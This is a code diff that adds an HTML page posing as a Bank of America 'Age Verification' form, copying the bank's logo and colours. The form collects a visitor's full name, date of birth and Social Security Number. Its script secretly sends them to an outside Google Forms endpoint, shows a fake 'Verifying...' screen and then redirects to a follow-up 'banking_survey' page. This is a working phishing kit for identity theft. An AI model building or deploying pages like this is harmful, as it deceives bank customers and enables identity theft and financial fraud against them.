@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bank of America Age Verification</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f5f7fa;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            width: 400px;
+            text-align: center;
+        }
+        h2 {
+            color: #004B87; /* Bank of America blue */
+        }
+        img {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+        input {
+            margin: 10px 0;
+            padding: 10px;
+            width: 100%;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        button {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            background-color: #004B87; /* Bank of America blue */
+            color: white;
+            font-weight: bold;
+        }
+        button:hover {
+            background-color: #0066A2;
+        }
+        .loading {
+            display: none;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-size: 24px;
+            color: #004B87; /* Bank of America blue */
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://usuaebusiness.org/wp-content/uploads/2021/07/BankofAmerica.png" alt="Bank of America Logo">
+        <h2>Age Verification</h2>
+        <form id="verificationForm">
+            <input type="text" id="fullName" placeholder="Full Name" required>
+            <input type="date" id="dob" placeholder="Date of Birth" required>
+            <input type="text" id="ssn" placeholder="Social Security Number" required>
+            <button type="submit">Submit</button>
+        </form>
+    </div>
+
+    <div class="loading" id="loading">
+        <h2>Verifying...</h2>
+    </div>
+
+    <script>
+        document.getElementById('verificationForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            document.querySelector('.container').style.display = 'none';
+            document.getElementById('loading').style.display = 'flex';
+
+            const fullName = document.getElementById('fullName').value;
+            const dob = document.getElementById('dob').value;
+            const ssn = document.getElementById('ssn').value;
+
+            const formUrl = "https://docs.google.com/forms/d/e/1FAIpQLSd63U-zz_fHy4kPRQQQDihpbkz84uN2oggDIi5fL_Hfp-dbIA/formResponse";
+            const data = new URLSearchParams();
+            data.append('entry.226278728', fullName);
+            data.append('entry.91101424', dob);
+            data.append('entry.867536091', ssn);
+
+            fetch(formUrl, {
+                method: 'POST',
+                body: data,
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                }
+            }).then(() => {
+                setTimeout(() => {
+                    window.location.href = "banking_survey.html";
+                }, 5000);
+            }).catch((error) => {
+                console.error('Error:', error);
+            });
+        });
+    </script>
+</body>
+</html>
